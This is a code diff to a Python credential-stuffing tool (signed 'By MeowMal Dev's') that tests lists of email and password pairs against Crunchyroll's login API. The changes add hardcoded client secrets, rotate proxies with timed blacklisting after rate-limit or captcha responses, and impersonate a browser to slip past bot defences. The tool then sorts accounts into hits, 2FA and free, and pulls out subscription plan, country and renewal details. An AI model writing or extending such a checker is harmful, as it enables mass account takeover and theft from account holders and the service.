@@ -10,6 +10,7 @@ import base64
 import configparser
 import ctypes
 import sys
+import urllib.parse
 from datetime import datetime, timezone
 from itertools import cycle
 
@@ -74,6 +75,12 @@ AUTH_UA      = "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"
 
 CLIENT_CREDS = [
     {
+        "client_id": "rjs0ltx0dbwkliwxdzdf",
+        "client_secret": "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s",
+        "device_type": "SamsungTV",
+        "device_name": "Goku"
+    },
+    {
         "client_id": "nmhhg0l6xyxcfm6ht6hf",
         "client_secret": "J4zmMfv3d1QdXy8t96wScx7hRy3rPG-3",
         "device_type": "SamsungTV",
@@ -109,11 +116,11 @@ def log_debug(message):
                 f.write(f"[{datetime.now().isoformat()}] {message}\n")
         except Exception:
             pass
-TIMEOUT     = 4
+TIMEOUT     = 6
 
 proxies_list  = []
 proxy_cycle   = None
-dead_proxies  = set()   
+dead_proxies  = {}   
 hits         = 0
 bads         = 0
 free_accs    = 0
@@ -161,26 +168,15 @@ def load_proxies():
         proxies_list = []
 
 
-def get_proxy():
-    if not proxies_list:
-        return None, None
-    with proxy_lock:
-        if len(dead_proxies) >= len(proxies_list) * 0.85:
-            dead_proxies.clear()
-        for _ in range(len(proxies_list)):
-            proxy_str = next(proxy_cycle)
-            if proxy_str not in dead_proxies:
-                break
-        else:
-            dead_proxies.clear()
-            proxy_str = next(proxy_cycle)
-
+def parse_proxy_url(proxy_str):
     if "://" in proxy_str:
         return {"http": proxy_str, "https": proxy_str}, proxy_str
     parts = proxy_str.split(':')
     if len(parts) == 4:
         host, port, user, pw = parts
-        url = f"{PROXY_TYPE}://{user}:{pw}@{host}:{port}"
+        encoded_user = urllib.parse.quote(user)
+        encoded_pw = urllib.parse.quote(pw)
+        url = f"{PROXY_TYPE}://{encoded_user}:{encoded_pw}@{host}:{port}"
         return {"http": url, "https": url}, proxy_str
     elif len(parts) == 2:
         url = f"{PROXY_TYPE}://{proxy_str}"
@@ -188,11 +184,38 @@ def get_proxy():
     return None, proxy_str
 
 
+def get_proxy():
+    if not proxies_list:
+        return None, None
+    now = time.time()
+    with proxy_lock:
+
+        for p in list(dead_proxies.keys()):
+            if now - dead_proxies[p] > 180:
+                dead_proxies.pop(p, None)
+        
+
+        for _ in range(len(proxies_list)):
+            proxy_str = next(proxy_cycle)
+            if proxy_str not in dead_proxies:
+                return parse_proxy_url(proxy_str)
+        
+
+        if dead_proxies:
+            oldest_proxy = min(dead_proxies, key=dead_proxies.get)
+            dead_proxies.pop(oldest_proxy, None)
+            return parse_proxy_url(oldest_proxy)
+            
+
+        proxy_str = next(proxy_cycle)
+        return parse_proxy_url(proxy_str)
+
+
 def mark_dead(proxy_raw):
-    """Mark a proxy as dead (timeout) so it gets skipped."""
+    """Mark a proxy as dead (timeout/block) with a timestamp so it gets skipped."""
     if proxy_raw:
         with proxy_lock:
-            dead_proxies.add(proxy_raw)
+            dead_proxies[proxy_raw] = time.time()
 
 
 def update_title():
@@ -266,6 +289,17 @@ class RetryException(Exception):
 
 
 def check_account(email, password):
+    session = make_session()
+    try:
+        return _check_account_impl(email, password, session)
+    finally:
+        try:
+            session.close()
+        except Exception:
+            pass
+
+
+def _check_account_impl(email, password, session):
     global checked, hits, bads, free_accs, retries_cnt, errors_cnt, two_fa
 
     attempt = 0
@@ -273,7 +307,11 @@ def check_account(email, password):
         attempt += 1
 
         proxy, proxy_raw = get_proxy()
-        session = make_session(proxy=proxy)
+        session.proxies = proxy
+        try:
+            session.cookies.clear()
+        except Exception:
+            pass
 
         try:
             device_id = str(uuid.uuid4())
@@ -283,11 +321,13 @@ def check_account(email, password):
                 "Accept": "application/json",
                 "Accept-Charset": "UTF-8",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "User-Agent": AUTH_UA,
+                "x-datadog-sampling-priority": "0",
                 "etp-anonymous-id": str(uuid.uuid4()),
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip"
             }
+            if not CFFI_AVAILABLE:
+                headers["User-Agent"] = AUTH_UA
             
             access_token = None
             account_id = None
@@ -315,42 +355,62 @@ def check_account(email, password):
                     raise RetryException()
 
                 status_code = r_token.status_code
+                token_body = safe_json(r_token)
+
+                if token_body is None:
+
+                    log_debug(f"Direct Login Non-JSON Response (Status {status_code}) using {cred['client_id']} and {proxy_raw}")
+                    mark_dead(proxy_raw)
+                    with lock:
+                        retries_cnt += 1
+                    raise RetryException()
+
+                body_str = json.dumps(token_body).lower()
+
                 if status_code == 200:
-                    token_body = safe_json(r_token)
-                    if token_body:
-                        access_token = token_body.get("access_token")
-                        account_id = token_body.get("account_id")
-                        if access_token:
-                            login_success = True
-                            break
-                elif status_code == 401:
-                    token_body = safe_json(r_token) or {}
-                    body_str = json.dumps(token_body).lower()
-                    
-                    if "multi_factor_required" in body_str or "mfa" in body_str:
-                        with lock:
-                            two_fa += 1
-                            checked += 1
-                            if UI_MODE == "2":
-                                print(f"{YELLOW}[!] 2FA: {email}{RESET}")
-                        return
-                    
-                    if "force_password_reset" in body_str:
-                        with lock:
-                            bads += 1
-                            checked += 1
-                            if UI_MODE == "2":
-                                print(f"{RED}[-] Invalid(Reset): {email}{RESET}")
-                        return
-                        
-                    if any(x in body_str for x in ["invalid_credentials", "invalid_password", "invalid_grant", "incorrect_password"]):
-                        with lock:
-                            bads += 1
-                            checked += 1
-                            if UI_MODE == "2":
-                                print(f"{RED}[-] Invalid: {email}{RESET}")
-                        return
-                elif status_code in [403, 429, 502, 503, 504]:
+                    access_token = token_body.get("access_token")
+                    account_id = token_body.get("profile_id") or token_body.get("account_id")
+                    if access_token:
+                        login_success = True
+                        break
+                
+
+                if "multi_factor_required" in body_str or "mfa" in body_str:
+                    with lock:
+                        two_fa += 1
+                        checked += 1
+                        if UI_MODE == "2":
+                            print(f"{YELLOW}[!] 2FA: {email}{RESET}")
+                    return
+                
+
+                if "force_password_reset" in body_str:
+                    with lock:
+                        bads += 1
+                        checked += 1
+                        if UI_MODE == "2":
+                            print(f"{RED}[-] Invalid(Reset): {email}{RESET}")
+                    return
+                
+
+                if any(x in body_str for x in ["invalid_credentials", "invalid_password", "invalid_grant", "incorrect_password"]):
+                    with lock:
+                        bads += 1
+                        checked += 1
+                        if UI_MODE == "2":
+                            print(f"{RED}[-] Invalid: {email}{RESET}")
+                    return
+
+
+                if any(x in body_str for x in ["too_many_requests", "rate_limit", "rate.limit", "captcha", "forbidden"]):
+                    log_debug(f"Direct Login Rate Limited/Blocked using {cred['client_id']} and {proxy_raw}: {body_str}")
+                    mark_dead(proxy_raw)
+                    with lock:
+                        retries_cnt += 1
+                    raise RetryException()
+
+
+                if status_code in [403, 429, 500, 502, 503, 504]:
                     log_debug(f"Direct Login Blocked/Error (Status {status_code}) using {cred['client_id']} and {proxy_raw}")
                     mark_dead(proxy_raw)
                     with lock:
@@ -358,17 +418,17 @@ def check_account(email, password):
                     raise RetryException()
 
             if not login_success:
+
+                log_debug(f"Direct Login Failed for {email} without explicit invalid credentials. Retrying with next proxy.")
+                mark_dead(proxy_raw)
                 with lock:
-                    bads += 1
-                    checked += 1
-                    if UI_MODE == "2":
-                        print(f"{RED}[-] Invalid: {email}{RESET}")
-                return
+                    retries_cnt += 1
+                raise RetryException()
 
 
             if not account_id and access_token:
                 jwt_claims = decode_jwt_payload(access_token)
-                account_id = jwt_claims.get("account_id") or jwt_claims.get("sub") or jwt_claims.get("aud")
+                account_id = jwt_claims.get("profile_id") or jwt_claims.get("account_id") or jwt_claims.get("sub") or jwt_claims.get("aud")
                 if isinstance(account_id, list):
                     account_id = account_id[0] if account_id else None
 
@@ -376,7 +436,6 @@ def check_account(email, password):
             etp_id = str(uuid.uuid4())
             bearer_headers = {
                 "Host":             "beta-api.crunchyroll.com",
-                "User-Agent":       AUTH_UA,
                 "Pragma":           "no-cache",
                 "Accept":           "*/*",
                 "authorization":    f"Bearer {access_token}",
@@ -384,6 +443,8 @@ def check_account(email, password):
                 "etp-anonymous-id": etp_id,
                 "Accept-Encoding":  "gzip, deflate",
             }
+            if not CFFI_AVAILABLE:
+                bearer_headers["User-Agent"] = AUTH_UA
 
             external_id    = None
             email_verified = "N/A"
@@ -422,6 +483,7 @@ def check_account(email, password):
 
             if r_me.status_code != 200:
                 log_debug(f"Step 4 Bad Status (Status {r_me.status_code}) for {email} using {proxy_raw}")
+                mark_dead(proxy_raw)
                 with lock:
                     retries_cnt += 1
                 raise RetryException()
@@ -462,30 +524,28 @@ def check_account(email, password):
 
                 if r_ben.status_code != 200 and r_ben.status_code != 404:
                     log_debug(f"Step 5 Bad Status (Status {r_ben.status_code}) for {email} using {proxy_raw}")
+                    mark_dead(proxy_raw)
                     with lock:
                         retries_cnt += 1
                     raise RetryException()
 
+                has_benefits = True
                 if any(x in ben_text for x in [
                     '"total":0', "subscription.not_found",
                     "Subscription Not Found", '"items":[]'
                 ]) or r_ben.status_code == 404:
-                    with lock:
-                        free_accs += 1
-                        checked   += 1
-                        if UI_MODE == "2":
-                            print(f"{YELLOW}[-] FREE: {email}{RESET}")
-                    return
+                    has_benefits = False
 
-                ben_data = safe_json(r_ben) or {}
-                country = ben_data.get("subscription_country", "N/A") or "N/A"
+                if has_benefits:
+                    ben_data = safe_json(r_ben) or {}
+                    country = ben_data.get("subscription_country", "N/A") or "N/A"
 
-                if "concurrent_streams.6" in ben_text:
-                    plan_name = STREAM_PLAN_MAP["6"]
-                elif "concurrent_streams.4" in ben_text:
-                    plan_name = STREAM_PLAN_MAP["4"]
-                elif "concurrent_streams.1" in ben_text:
-                    plan_name = STREAM_PLAN_MAP["1"]
+                    if "concurrent_streams.6" in ben_text:
+                        plan_name = STREAM_PLAN_MAP["6"]
+                    elif "concurrent_streams.4" in ben_text:
+                        plan_name = STREAM_PLAN_MAP["4"]
+                    elif "concurrent_streams.1" in ben_text:
+                        plan_name = STREAM_PLAN_MAP["1"]
 
 
             renew_at       = "N/A"
@@ -506,16 +566,17 @@ def check_account(email, password):
                         "authorization":    f"Bearer {access_token}",
                         "etp-anonymous-id": etp_id,
                         "Accept-Encoding":  "gzip, deflate",
-                        "User-Agent":       AUTH_UA,
                     }
+                    if not CFFI_AVAILABLE:
+                        v4_headers["User-Agent"] = AUTH_UA
                     r_v4 = session.get(
                         SUBS_V4_URL.format(account_id),
                         headers=v4_headers,
                         timeout=TIMEOUT,
                     )
                     
-                    if r_v4.status_code in [403, 429, 502, 503, 504]:
-                        log_debug(f"Step 6 v4 Proxy Block/Rate Limit (Status {r_v4.status_code}) for {email} using {proxy_raw}")
+                    if r_v4.status_code != 200 and r_v4.status_code != 404:
+                        log_debug(f"Step 6 v4 Proxy Block/Rate Limit/Error (Status {r_v4.status_code}) for {email} using {proxy_raw}")
                         mark_dead(proxy_raw)
                         with lock:
                             retries_cnt += 1
@@ -541,8 +602,8 @@ def check_account(email, password):
                             headers=v4_headers,
                             timeout=TIMEOUT,
                         )
-                        if r_v3.status_code in [403, 429, 502, 503, 504]:
-                            log_debug(f"Step 6 v3 Proxy Block/Rate Limit (Status {r_v3.status_code}) for {email} using {proxy_raw}")
+                        if r_v3.status_code != 200 and r_v3.status_code != 404:
+                            log_debug(f"Step 6 v3 Proxy Block/Rate Limit/Error (Status {r_v3.status_code}) for {email} using {proxy_raw}")
                             mark_dead(proxy_raw)
                             with lock:
                                 retries_cnt += 1
@@ -735,11 +796,6 @@ def check_account(email, password):
             return
         except RetryException:
             continue
-        finally:
-            try:
-                session.close()
-            except Exception:
-                pass
 
 
     with lock:
@@ -753,6 +809,15 @@ def main():
     clear_screen()
     print(LOGO)
     print(f"{RED}By MeowMal Dev's{RESET}")
+
+
+    if CFFI_AVAILABLE:
+        try:
+            from curl_cffi.requests import Session as CFSession
+            dummy = CFSession(impersonate="chrome120")
+            dummy.close()
+        except Exception:
+            pass
 
     if not CFFI_AVAILABLE:
         print(f"{YELLOW}[!] curl_cffi not installed — run: pip install curl_cffi{RESET}")
